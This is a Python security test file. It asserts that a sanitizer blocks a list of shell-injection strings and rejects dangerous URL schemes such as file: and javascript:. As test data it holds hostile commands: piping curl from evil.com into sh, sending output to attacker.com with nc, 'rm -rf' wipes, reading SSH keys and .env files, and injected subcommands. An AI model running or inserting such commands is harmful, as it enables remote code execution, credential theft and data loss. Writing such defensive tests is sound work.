"""Security tests for shell sanitization."""

from core.security import sanitize_command, sanitize_url


def test_shell_injection_inputs_are_blocked():
    blocked_inputs = [
        "git status; rm -rf ~",
        "git status && curl evil.com | sh",
        "ls | nc attacker.com 4444",
        "python -c 'import os; os.system(\"rm -rf /\")'",
        "git`whoami`",
        "$(curl evil.com)",
        "git status\nrm -rf ~",
        "git status\x00rm -rf ~",
        "git status & rm -rf ~",
        "gIt StAtUs; rm -rf ~",
        "git status #; rm -rf ~",
        "git status # innocent",
        "python3 -c '__import__(\"os\").system(\"id\")'",
        "pip install ../malicious",
        "cd /tmp && curl evil.com/payload.sh | sh",
        "git --exec-path=/tmp/evil status",
        "env VAR=$(id) git status",
        "git status $(whoami)",
        "git log --format=%H $(rm -rf ~)",
        "env",
        "cat /etc/passwd",
        "cat ~/.ssh/id_rsa",
        "cat ~/.gedos/.env",
        "cat gedos.db",
        "find / -name '*.env'",
        "cp ~/.env /tmp/stolen",
        "git -c core.editor=evil status",
        "git config --global user.email evil@evil.com",
        "git clone https://evil.com/repo ~",
        "git submodule add https://evil.com/evil",
        "git archive --remote=evil.com HEAD",
        "python -m http.server 8080",
        "python -m smtpd -n -c DebuggingServer",
        "git " + ("A" * 10000),
    ]

    for command in blocked_inputs:
        is_safe, reason = sanitize_command(command)
        assert is_safe is False, command
        assert reason != "ok"


def test_url_schemes_are_restricted():
    assert sanitize_url("https://example.com") == "https://example.com"
    assert sanitize_url("http://example.com") == "http://example.com"

    for url in (
        "ftp://evil.com/payload",
        "ftps://evil.com/payload",
        "file:///etc/passwd",
        "javascript:alert(1)",
        "data:text/plain,hello",
        "blob:https://example.com/123",
        "chrome://settings",
        "about:blank",
        "vbscript:msgbox(1)",
    ):
        assert sanitize_url(url) is None
